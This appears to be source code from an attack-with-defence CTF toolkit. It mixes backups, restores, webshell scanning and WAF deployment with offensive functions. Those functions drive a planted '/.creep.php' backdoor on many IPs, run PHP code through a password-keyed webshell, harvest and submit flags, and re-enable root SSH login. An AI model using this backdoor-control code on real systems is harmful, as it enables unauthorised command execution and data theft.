            self.c_hb_msg(f'存活: {alive}/{len(ips)} 死亡: {dead}', 'alive' if alive > dead else 'dead')
            self._heartbeat_after(stopper, 0, lambda a=alive, d=dead: self.c_hb_lbl.config(text=f'🟢 {a}  🔴 {d}', foreground='#00ff9d' if a > d else '#ff4d6d'))
            for _ in range(interval):
                if stopper.is_set():
                    break
                time.sleep(1)
        self.c_hb_msg('心跳监控已停止', 'info')
    return run
CLOSURES['CreepTab.toggle_creep_hb.<locals>.run@3762']=_factory_184221a44f8e
def _factory_191fe53cf76c(c):

    def check(ip):
        try:
            base = make_base(ip, c['port'], c['https'])
            r = requests.get(f'{base}/.creep.php', timeout=c['timeout'])
            return (ip, r.status_code in (200, 403))
        except Exception:
            return (ip, False)
    return check
CLOSURES['CreepTab.toggle_creep_hb.<locals>.run.<locals>.check@3766']=_factory_191fe53cf76c
def _factory_3ddb5159a26a(lw, self, wd):

    def _local():
        import tarfile
        bak_dir = self._bak_dir()
        bak_path = os.path.join(bak_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz")
        with tarfile.open(bak_path, 'w:gz') as tar:
            tar.add(wd, arcname=os.path.basename(wd))
        lw.log(f'[OK] 本地备份完成 ({os.path.getsize(bak_path) / 1024:.1f}KB)', 'ok')
    return _local
CLOSURES['OpsTab.do_backup.<locals>._local@3955']=_factory_3ddb5159a26a
def _factory_72afc44ed180(host, lw, port, pwd, rdir, self, user):

    def _ssh():
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
            import ntpath
            parent_dir = ntpath.dirname(rdir.rstrip('/')) or '/var/www'
            dir_name = ntpath.basename(rdir.rstrip('/')) or 'html'
            stdin, stdout, stderr = ssh.exec_command(f'tar czf - -C {parent_dir} {dir_name} 2>/dev/null')
            data = stdout.read()
            bak_dir = self._bak_dir()
            bak_path = os.path.join(bak_dir, f"ssh_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz")
            with open(bak_path, 'wb') as f:
                f.write(data)
            lw.log(f'[OK] SSH备份完成 ({os.path.getsize(bak_path) / 1024:.1f}KB)', 'ok')
            ssh.close()
        except Exception as e:
            lw.log(f'[FAIL] SSH备份失败: {e}', 'fail')
    return _ssh
CLOSURES['OpsTab.do_backup.<locals>._ssh@3968']=_factory_72afc44ed180
def _factory_cd8970b73396(backup, destination, lw):

    def run():
        try:
            count = restore_local_archive(backup, destination)
            lw.log(f'[OK] 还原完成：{count} 个文件', 'ok')
        except Exception as exc:
            lw.log(f'[FAIL] 还原失败：{exc}', 'fail')
    return run
CLOSURES['OpsTab.do_restore.<locals>.run@4009']=_factory_cd8970b73396
def _factory_6e3a34ce8b68(backup, destination, host, lw, password, port, user):

    def run_remote():
        ssh = sftp = None
        remote = None
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.RejectPolicy())
            ssh.connect(host, port=port, username=user, password=password, timeout=15)
            sftp = ssh.open_sftp()
            remote = '/tmp/yl_restore_' + next(tempfile._get_candidate_names()) + '.tar.gz'
            sftp.put(backup, remote)
            sftp.close()
            sftp = None
            _, stdout, stderr = ssh.exec_command(f'tar xzf {shlex.quote(remote)} -C {shlex.quote(destination)} --strip-components=1', timeout=60)
            output = stdout.read().decode('utf-8', errors='replace')
            error = stderr.read().decode('utf-8', errors='replace')
            status = stdout.channel.recv_exit_status()
            if status != 0:
                raise RuntimeError(f'远程解压失败，退出码 {status}：{error[:300]}')
            lw.log(f'[OK] 远程还原完成 {output[:200]}', 'ok')
        except Exception as exc:
            lw.log(f'[FAIL] 远程还原失败：{exc}', 'fail')
        finally:
            if sftp is not None:
                sftp.close()
            if ssh is not None:
                if remote is not None:
                    try:
                        _, cleanup_out, _ = ssh.exec_command('rm -f -- ' + shlex.quote(remote), timeout=10)
                        cleanup_out.channel.recv_exit_status()
                    except Exception:
                        pass
                ssh.close()
    return run_remote
CLOSURES['OpsTab.do_restore.<locals>.run_remote@4033']=_factory_6e3a34ce8b68
def _factory_f5ff3efa0155(PATTERNS, d, delete, lw):

    def scan():
        total = sus = 0
        for root, dirs, files in os.walk(d):
            dirs[:] = [x for x in dirs if not x.startswith('.') and x not in ('node_modules', 'vendor', 'cache', 'runtime')]
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in ('.php', '.php5', '.phtml', '.php7', '.pht', '.asp', '.aspx', '.jsp'):
                    continue
                fpath = os.path.join(root, fname)
                total += 1
                try:
                    sz = os.path.getsize(fpath)
                    if sz > 10485760:
                        continue
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                        content = fh.read(262144)
                    findings = []
                    for pat, desc in PATTERNS:
                        if re.search(pat, content, re.I):
                            findings.append(desc)
                    if findings:
                        sus += 1
                        lw.log(f'  [!] {fpath}', 'warn')
                        for desc in findings:
                            lw.log(f'      → {desc}', 'fail')
                        if delete:
                            try:
                                os.remove(fpath)
                                lw.log(f'      已删除', 'ok')
                            except Exception as ex:
                                lw.log(f'      删除失败: {ex}', 'fail')
                except Exception:
                    pass
        lw.log(f'扫描完成: {total} 文件, {sus} 可疑', 'ok' if sus == 0 else 'warn')
    return scan
CLOSURES['OpsTab.do_scan.<locals>.scan@4121']=_factory_f5ff3efa0155
def _factory_0486f2253587(name, self, table):

    def run():
        r = self._db_cmd(f'SELECT * FROM `{name}`.`{table}` LIMIT 50', timeout=20)
        self.db_lw.log(r[:4000] or '[无数据]', 'out')
    return run
CLOSURES['OpsTab.do_db_data.<locals>.run@4219']=_factory_0486f2253587
def _factory_15b51ab90e3e(qs, self):

    def run():
        r = self._db_cmd(qs, timeout=20)
        self.db_lw.log(r[:4000] or '[OK] 执行完成', 'ok' if not r.strip() else 'out')
    return run
CLOSURES['OpsTab.do_db_sql.<locals>.run@4232']=_factory_15b51ab90e3e
def _factory_2462eb9eacfe(ip, self):

    def run():
        fname = f"db_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.gz"
        cmd = f'mysqldump -u{self.db_user.get().strip()} -p{self.db_pass.get().strip()} --all-databases 2>/dev/null | gzip -c | base64 -w0'
        r = self._ssh_connect(ip, self.db_ssh_port.get(), self.db_ssh_user.get(), self.db_ssh_pass.get(), cmd, timeout=30)
        if r.startswith('[ERROR]'):
            self.db_lw.log(f'[FAIL] {r}', 'fail')
        else:
            out = os.path.join(CONFIG_DIR, fname)
            with open(out, 'wb') as fh:
                try:
                    fh.write(base64.b64decode(r))
                except Exception:
                    fh.write(r.encode())
            sz = os.path.getsize(out)
            self.db_lw.log(f'[OK] 备份保存: {os.path.join(CONFIG_DIR, fname)} ({sz / 1024:.1f}KB)', 'ok')
    return run
CLOSURES['OpsTab.do_db_dump.<locals>.run@4240']=_factory_2462eb9eacfe
def _factory_a4fb815dc358(cmd, ips, lw, port, self, timeout, vh):

    def run():
        for ip in ips[:5]:
            try:
                base = make_base(ip, port, vh.get())
                r = requests.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=timeout)
                lw.log(f'  [{ip}] {r.text[:100]}', 'ok' if r.status_code == 200 else 'fail')
            except Exception as e:
                lw.log(f'  [FAIL] {ip}: {e}', 'fail')
    return run
CLOSURES['OpsTab.do_harden.<locals>.run@4303']=_factory_a4fb815dc358
def _factory_0dda44b2bed2(https, ips, port, self, timeout):

    def run():
        _try_add_path(os.path.join(BASE, '防御模块'))
        from auto_fix import VulnScanner
        total = len(ips)
        for i, ip in enumerate(ips, 1):
            self.af_log_msg(f'扫描 [{i}/{total}] {ip}...', 'info')
            try:
                s = VulnScanner()
                file_list_cmd = "find /var/www/html /app/web /var/www /web /www -type f \\( -name '*.php' -o -name '*.py' -o -name '*.jsp' -o -name '*.js' \\) 2>/dev/null | head -100"
                file_list = self._exec_cmd(ip, file_list_cmd, port, https, timeout)
                files = []
                if file_list:
                    for line in file_list.split('\n'):
                        line = line.strip()
                        if line and line.endswith(('.php', '.py', '.jsp', '.js')):
                            files.append(line)
                self.af_log_msg(f'  发现 {len(files)} 个源码文件', 'info')
                for fp in list(set(files))[:50]:
                    try:
                        content = self._exec_cmd(ip, f'cat {fp}', port, https, timeout)
                        if content:
                            findings = s.scan_file(fp, content)
                            s.findings.extend(findings)
                    except Exception:
                        pass
                s.stats['scanned'] = len(set(files))
                self._af_findings.extend(s.findings)
            except Exception as e:
                self.af_log_msg(f'[FAIL] {ip}: {e}', 'fail')
            if hasattr(self, 'af_lbl_stat'):
                self.root.after(0, lambda c=f'扫描中 {i}/{total}': self.af_lbl_stat.config(text=c, foreground='#ffcc00'))
        self.root.after(0, self.af_refresh_tree)
        summary = f'扫描完成: {len(self._af_findings)} 个发现'
        self.af_log_msg(summary, 'ok')
        self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(self._af_findings)} 个发现', foreground='#00ff9d'))
    return run
CLOSURES['OpsTab.af_scan_remote.<locals>.run@4378']=_factory_0dda44b2bed2
def _factory_edd60be42c9b(path, self):

    def run():
        _try_add_path(os.path.join(BASE, '防御模块'))
        from auto_fix import VulnScanner
        s = VulnScanner()
        s.scan_directory(path)
        self._af_findings = s.findings
        self.root.after(0, self.af_refresh_tree)
        self.af_log_msg(s.summary(), 'ok')
        self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(s.findings)} 个发现', foreground='#00ff9d'))
    return run
CLOSURES['OpsTab.af_scan_local.<locals>.run@4425']=_factory_edd60be42c9b
def _factory_56fda1ff99ac(bd, cfg, interval, self, stopper):

    def run():
        import tarfile
        try:
            os.makedirs(bd, exist_ok=True)
        except Exception:
            pass
        last_ok = None
        while not stopper.is_set():
            try:
                fname = f"auto_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
                fpath = os.path.join(bd, fname)
                if cfg['mode'] == 'ssh':
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(cfg['host'], int(cfg['sport']), cfg['suser'], cfg['spass'], timeout=15, allow_agent=False, look_for_keys=False)
                    import ntpath
                    parent_dir = ntpath.dirname(cfg['webdir'].rstrip('/')) or '/var/www'
                    dir_name = ntpath.basename(cfg['webdir'].rstrip('/')) or 'html'
                    stdin, stdout, stderr = ssh.exec_command(f'tar czf - -C {parent_dir} {dir_name} 2>/dev/null', timeout=60)
                    data = stdout.read()
                    ssh.close()
                    if not data:
                        raise RuntimeError('远程tar无输出(目录可能不存在)')
                    with open(fpath, 'wb') as fh:
                        fh.write(data)
                else:
                    with tarfile.open(fpath, 'w:gz') as tar:
                        tar.add(cfg['webdir'], arcname=os.path.basename(cfg['webdir']))
                sz = os.path.getsize(fpath)
                last_ok = fname
                self.root.after(0, lambda fn=fname, s=sz: self.sb_lw.log(f'[OK] {fn} ({s / 1024:.0f}KB)', 'ok'))
                self.root.after(0, lambda fn=fname, d=bd: self.sb_last.config(text=f'{fn} @ {d}'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.sb_lw.log(f'[FAIL] 备份失败: {e}', 'fail'))
            stopper.wait(interval * 60)
    return run
CLOSURES['OpsTab.toggle_sched_backup.<locals>.run@4695']=_factory_56fda1ff99ac
def _factory_2a40ba9b1c71(TOOLS_DIR, e_port, ips, lw, mode, timeout):

    def run():
        for ip in ips:
            try:
                if mode == 'ping':
                    r = subprocess.run(['ping', '-n', '1', '-w', str(int(timeout * 1000)), ip], capture_output=True, timeout=timeout + 5)
                    alive = r.returncode == 0
                elif mode == 'naabu':
                    naabu_exe = os.path.join(TOOLS_DIR, 'naabu_2.3.3_windows_amd64', 'naabu.exe')
                    if os.path.exists(naabu_exe):
                        port_str = e_port.get().strip() or '80'
                        try:
                            r = subprocess.run([naabu_exe, '-host', ip, '-p', port_str, '-silent'], capture_output=True, timeout=timeout + 10)
                            alive = ip.encode() in r.stdout
                        except Exception:
                            alive = False
                    else:
                        lw.log(f'  [SKIP] {ip}: naabu未找到', 'warn')
                        alive = False
                else:
                    ports = [int(x.strip()) for x in e_port.get().strip().split(',') if x.strip()]
                    alive = False
                    for p in ports:
                        try:
                            s = socket.socket()
                            s.settimeout(timeout)
                            r = s.connect_ex((ip, p))
                            s.close()
                            if r == 0:
                                alive = True
                                break
                        except Exception:
                            pass
                tag = 'ok' if alive else 'fail'
                lw.log(f"  {('[ALIVE]' if alive else '[DEAD]')} {ip}", tag)
            except Exception as ex:
                lw.log(f'  [ERR] {ip}: {ex}', 'fail')
    return run
CLOSURES['OpsTab.do_discover.<locals>.run@4754']=_factory_2a40ba9b1c71
def _factory_4d8f79a4f7a5(ips, np, port, pw, self, user):

    def run():
        for ip in ips:
            try:
                self.ssh_lw.log(f'  [{ip}] 连接中...', 'info')
                r1 = self._ssh_connect(ip, port, user, pw, f'echo "{user}:{np}" | chpasswd 2>&1', timeout=10)
                self.ssh_lw.log(f"  [{ip}] 改密: {('OK' if 'DONE' in r1 or not r1.strip() else r1[:60])}", 'ok')
                cmds = ['sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config', 'sed -i "s/PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config', 'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null', 'chmod 755 /var/www/html 2>/dev/null', 'find /var/www/html -type d -exec chmod 755 {} \\; 2>/dev/null', 'find /var/www/html -type f -exec chmod 644 {} \\; 2>/dev/null']
                for c in cmds:
                    self._ssh_connect(ip, port, user, np, c, timeout=5)
                self.ssh_lw.log(f'  [{ip}] 加固完成', 'ok')
            except Exception as e:
                self.ssh_lw.log(f'  [FAIL] {ip}: {e}', 'fail')
    return run
CLOSURES['OpsTab.do_ssh_batch.<locals>.run@4853']=_factory_4d8f79a4f7a5
def _factory_fbfdb55daddd(cmd, ep, ips, lw, self, timeout, vh):

    def go():
        for ip in ips[:3]:
            try:
                base = make_base(ip, int(ep.get() or 80), vh.get())
                r = requests.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=timeout)
                lw.log(f'[{ip}]\n{r.text[:2000]}', 'out')
            except Exception as e:
                lw.log(f'[FAIL] {ip}: {e}', 'fail')
    return go
CLOSURES['OpsTab.do_ps.<locals>.go@4893']=_factory_fbfdb55daddd
def _factory_0b532ec06ff9(ip, path, port, pw, self):

    def run():
        try:
            base = f'http://{ip}:{port}'
            r = _session().post(f'{base}{path}', data={pw: 'phpinfo();exit;'}, timeout=10)
            if not r.text:
                r = _session().post(f'{base}{path}', data={pw: 'echo phpversion();'}, timeout=10)
            html = r.text
            rows = re.findall('<tr><td class="e">(.*?)</td><td class="v">(.*?)</td>', html, re.DOTALL)
            if not rows:
                rows = re.findall('<tr[^>]*><td[^>]*class="e"[^>]*>(.*?)</td><td[^>]*class="v"[^>]*>(.*?)</td>', html, re.DOTALL)
            for k, v in rows:
                k = re.sub('<[^>]+>', '', k).strip()
                v = re.sub('<[^>]+>', '', v).strip()
                if k and v:
                    self.pi_data.append((k, v[:200]))
            if not self.pi_data:
                r2 = _session().post(f'{base}{path}', data={pw: 'foreach(ini_get_all() as $k=>$v)echo "$k => {$v["local_value"]}\\n";'}, timeout=10)
                for line in r2.text.strip().split('\n'):
                    if ' => ' in line:
                        parts = line.split(' => ', 1)
                        self.pi_data.append((parts[0].strip(), parts[1].strip()[:200]))
            self.root.after(0, self.pi_refresh)
        except Exception as e:
            self.root.after(0, lambda e=e: messagebox.showerror('错误', str(e)))
    return run
CLOSURES['OpsTab.do_phpinfo.<locals>.run@4969']=_factory_0b532ec06ff9
def _factory_0bca952b30d6(refresh_external, root, self):

    def refresh_external():
        if getattr(self.tabs_ref, '_closing', False):
            return
        self.refresh(force=False)
        try:
            root.after(1500, refresh_external)
        except tk.TclError:
            pass
    return refresh_external
CLOSURES['MachinesTab.schedule_external_refresh.<locals>.refresh_external@5089']=_factory_0bca952b30d6
def _factory_cb4f73caef9f(machine, secure, self, variables, window):

    def save():
        changes = {key: variable.get() for key, variable in variables.items() if variable.get() != str(machine.get(key, ''))}
        if secure.get() != bool(machine.get('https', False)):
            changes['https'] = secure.get()
        if not changes:
            window.destroy()
            return
        try:
            if not self._store:
                raise ValueError('加密机子存储不可用')
            result = self._store.update_target(machine['id'], changes, expected_revision=machine['revision'])
            self.refresh()
            window.destroy()
            if result['requires_local_selection']:
                messagebox.showinfo('连接已更新', '目标 ID 保持不变；请在本机 AI 中枢按 ID 重新选择允许目标。')
        except Exception as exc:
            messagebox.showerror('更新失败', str(exc), parent=window)
    return save
CLOSURES['MachinesTab.build_target_editor.<locals>.save@5144']=_factory_cb4f73caef9f
def _factory_80721e496745(st):

    def log_msg(msg, tag='info'):
        st.config(state=tk.NORMAL)
        st.insert(tk.END, msg + '\n')
        st.see(tk.END)
        st.config(state=tk.DISABLED)
    return log_msg
CLOSURES['ToolsTab._log_widget.<locals>.log_msg@5256']=_factory_80721e496745
def _factory_da6bdc5cb231(br, self):

    def task():
        br.run_all(max_workers=int(self.br_workers.get()))
        self.root.after(0, lambda: self.br_log.log(f'[+] {br.summary()}'))
        if br.flags:
            dedup = set(br.flags)
            self.root.after(0, lambda: self.br_log.log(f'[+] 获取到 {len(dedup)} 个去重Flag'))
            for f in list(dedup)[:5]:
                self.root.after(0, lambda f=f: self.br_log.log(f'    {f}'))
            if br.submit_url:
                res = br.submit_flags()
                self.root.after(0, lambda: self.br_log.log(f"[+] 提交结果: {sum((1 for r in res if r['status'] == 'ok'))}/{len(res)}"))
    return task
CLOSURES['ToolsTab.br_run.<locals>.task@5453']=_factory_da6bdc5cb231
def _factory_99f7afa5386c():

    def _set(w, val):
        try:
            if w is not None and val:
                w.delete(0, tk.END)
                w.insert(0, val)
        except Exception:
            pass
    return _set
CLOSURES['AWDToolkit._apply_conn_ops.<locals>._set@5736']=_factory_99f7afa5386c
def _factory_779794706298(self):

    def _check():
        try:
            ip = self.global_ip.get().strip()
            if not ip:
                return
            import urllib.request, ssl
            ctx = ssl._create_unverified_context()
            results = []
            try:
                r = urllib.request.urlopen(f'http://{ip}:80/', timeout=3, context=ctx)
                results.append(f"Web:{('✅' if r.status == 200 else '❌')}")
            except Exception:
                try:
                    r = urllib.request.urlopen(f'http://{ip}:8804/', timeout=3, context=ctx)
                    results.append(f"Web:{('✅' if r.status == 200 else '❌')}")
                except Exception:
                    try:
                        r = urllib.request.urlopen(f'http://{ip}:8802/', timeout=3, context=ctx)
                        results.append(f"Web:{('✅' if r.status == 200 else '❌')}")
                    except Exception:
                        results.append('Web:❌')
            try:
                import socket
                s = socket.socket()
                s.settimeout(3)
                s.connect((ip, int(self.global_ssh_port.get().strip() or 2202)))
                s.close()
                results.append('SSH:✅')
            except Exception:
                results.append('SSH:❌')
            self.root.after(0, lambda: self.status_bar.config(text=' | '.join(results)))
        except Exception:
            self.root.after(0, lambda: self.status_bar.config(text='状态刷新失败'))
    return _check
CLOSURES['AWDToolkit._refresh_status.<locals>._check@5786']=_factory_779794706298
def _factory_b23c1831c2d6(self, state):

    def _kill():
        try:
            if state['ssh']:
                try:
                    state['ssh'].close()
                except Exception:
                    pass
        except Exception:
            pass
        self.root.after(0, lambda: self.status_bar.config(text='❌ 部署超时(120s)已中断'))
    return _kill
CLOSURES['AWDToolkit._run_workflow.<locals>._kill@5850']=_factory_b23c1831c2d6
def _factory_c0acce13ed12(host, port, pwd, self, ssh_port_str, ssh_user, state, watchdog, web_dir_input):

    def _run():
        try:
            import paramiko, os, time
            ssh = paramiko.SSHClient()
            state['ssh'] = ssh
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            last_err = None
            try:
                ssh_port = int(ssh_port_str) if str(ssh_port_str).strip() else 2202
            except Exception:
                ssh_port = 2202
            for attempt in range(3):
                try:
                    ssh.connect(host, port=ssh_port, username=ssh_user, password=pwd, timeout=10, allow_agent=False, look_for_keys=False, banner_timeout=15)
                    break
                except Exception as ce:
                    last_err = ce
                    time.sleep(2)
            else:
                err_s = str(last_err)
                el = err_s.lower()
                if 'timed out' in el or 'unreachable' in el or 'refused' in el or ('no route' in el):
                    raise RuntimeError(f'靶机不可达[{host}:{ssh_port}] 连接超时/被拒 — 靶机未启动或网络不通(非密码问题)')
                if 'authentication' in el:
                    raise RuntimeError(f'SSH认证失败[{host}:{ssh_port} 用户:{ssh_user}] — 用户名或密码错误: {err_s[:50]}')
                raise RuntimeError(f'SSH连接失败[{host}:{ssh_port}] (已重试3次): {err_s[:80]}')
            tr = ssh.get_transport()
            if tr:
                tr.sock.settimeout(30)
                tr.banner_timeout = 15
            sftp = None
            for attempt in range(3):
                try:
                    sftp = ssh.open_sftp()
                    sftp.get_channel().settimeout(30)
                    break
                except Exception as ce:
                    last_err = ce
                    time.sleep(2)
            if sftp is None:
                raise RuntimeError(f'SFTP连接失败(已重试3次): {str(last_err)[:80]}')
            base = BASE
            report = []
            self.root.after(0, lambda: self.status_bar.config(text='🚀 探测Web目录...'))
            web_dir = web_dir_input
            detect_cmd = 'for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
            try:
                _, so, _ = ssh.exec_command(detect_cmd, timeout=15)
                so.channel.settimeout(15)
                out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                if out and out[0].strip():
                    web_dir = out[0].strip()
                else:
                    _, so2, se2 = ssh.exec_command('mkdir -p /var/www/html && chmod 777 /var/www/html', timeout=15)
                    so2.channel.settimeout(15)
                    if so2.channel.recv_exit_status() != 0:
                        err2 = (se2.read().decode('utf-8', 'replace') or '').strip()
                        raise RuntimeError(f"无法创建 /var/www/html: {err2 or '权限不足'}")
            except Exception as de:
                raise RuntimeError(f'Web目录探测失败: {str(de)[:60]}')
            web_dir = web_dir.rstrip('/')
            mon_php = os.path.join(base, '上传靶机', 'target_monitor.php')
            if os.path.exists(mon_php):
                self.root.after(0, lambda: self.status_bar.config(text='🚀 部署监控脚本...'))
                with open(mon_php, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                content = content.replace('y|lladmin121.@ss', pwd)
                content = content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + pwd + "'")
                with sftp.open(f'{web_dir}/target_monitor.php', 'w') as fh:
                    fh.write(content)
                report.append(f'✅ 监控脚本 -> {web_dir}')
            waf_php = os.path.join(base, '上传靶机', 'waf_strong.php')
            waf_dat = os.path.join(base, '上传靶机', '.waf.dat')
            if os.path.exists(waf_php):
                self.root.after(0, lambda: self.status_bar.config(text='🚀 部署WAF...'))
                waf_content = render_waf_strong()
                if waf_content is None:
                    with open(waf_php, 'r', encoding='utf-8', errors='replace') as f:
                        waf_content = f.read()
                with sftp.open(f'{web_dir}/waf_strong.php', 'w') as f:
                    f.write(waf_content)
                report.append('✅ WAF文件')
            dat_content = None
            try:
                dat_content = self.waf.build_waf_dat()
            except Exception:
                pass
            if dat_content is None and os.path.exists(waf_dat):
                with open(waf_dat, 'r', encoding='utf-8', errors='replace') as f:
                    dat_content = f.read()
            if dat_content:
                with sftp.open(f'{web_dir}/.waf.dat.php', 'w') as f:
                    f.write(dat_content)
                try:
                    sftp.remove(f'{web_dir}/.waf.dat')
                except Exception:
                    pass
                report.append('✅ WAF规则')
            try:
                with sftp.open(f'{web_dir}/.user.ini', 'w') as f:
                    f.write('auto_prepend_file=waf_strong.php\n')
                with sftp.open(f'{web_dir}/.htaccess', 'w') as f:
                    f.write(_waf_htaccess())
            except Exception:
                pass
            ban_content = render_waf_ban()
            if ban_content:
                with sftp.open(f'{web_dir}/waf_ban.php', 'w') as f:
                    f.write(ban_content)
                report.append('✅ 黑名单脚本')
            try:
                _, bso, _ = ssh.exec_command(f'chmod 644 {web_dir}/waf_strong.php {web_dir}/.waf.dat.php {web_dir}/waf_ban.php {web_dir}/.htaccess {web_dir}/.user.ini 2>/dev/null; echo CHMOD_DONE', timeout=15)
                bso.channel.settimeout(15)
                bso.read()
            except Exception:
                pass
            try:
                mmsg = self.waf._auto_mount_waf(ssh, web_dir)
                if mmsg:
                    report.append(mmsg)
            except Exception:
                pass
            sftp.close()
            self.root.after(0, lambda: self.mon.password.set(pwd) if hasattr(self.mon, 'password') else None)
            self.root.after(0, lambda: self.status_bar.config(text='🔎 验证监控URL...'))
            base_url = None
            try:
                import urllib.request, urllib.parse as _up
                rels = ['']
                if web_dir.strip('/'):
                    rels.append('/' + web_dir.strip('/').split('/')[-1])
                probe_ports = []
                gp = str(port).strip() if port else ''
                if gp and gp not in ('80',):
                    probe_ports.append(gp)
                probe_ports += ['8804', '8802', '8080', '80']
                for p in probe_ports:
                    if base_url:
                        break
                    for rel in rels:
                        test = f'http://{host}:{p}{rel}/target_monitor.php'
                        try:
                            q = _up.urlencode({'u': 'monitor', 'p': pwd, 'ajax': '1', '_': '0'})
                            resp = urllib.request.urlopen(test + '?' + q, timeout=5)
                            body = resp.read(800)
                            if resp.status == 200 and b'lines' in body:
                                base_url = test
                                break
                        except Exception:
                            continue
            except Exception:
                pass
            if not base_url:
                if port and str(port).strip():
                    base_url = f'http://{host}:{port}/target_monitor.php'
                else:
                    base_url = f'http://{host}:8802/target_monitor.php'
            if hasattr(self.mon, 'target_url'):
                self.mon.target_url.set(base_url)
                self.mon.password.set(pwd)
            ssh.close()
            watchdog.cancel()
            self.root.after(0, lambda: self.status_bar.config(text=' | '.join(report) + ' | 🟢 就绪'))
            self.root.after(0, lambda: messagebox.showinfo('一键部署', '\n'.join(report) + '\n\n点「▶ 开始」启动监控'))
            self.root.after(0, lambda: self._log_workflow('✅ 一键部署完成: ' + ' | '.join(report)))
        except Exception as e:
            watchdog.cancel()
            self.root.after(0, lambda e=e: self.status_bar.config(text=f'❌ 部署失败: {str(e)[:60]}'))
            self.root.after(0, lambda e=e: self._log_workflow('❌ 一键部署失败: ' + str(e)[:100]))
            self.root.after(0, lambda e=e: messagebox.showerror('一键部署失败', f'部署流程出错:\n{e}\n\n检查: ①靶机网络是否可达(靶机没启动/网络不通时连不上) ②SSH端口是否正确 ③SSH用户/密码 ④Web目录权限'))
    return _run
CLOSURES['AWDToolkit._run_workflow.<locals>._run@5860']=_factory_c0acce13ed12
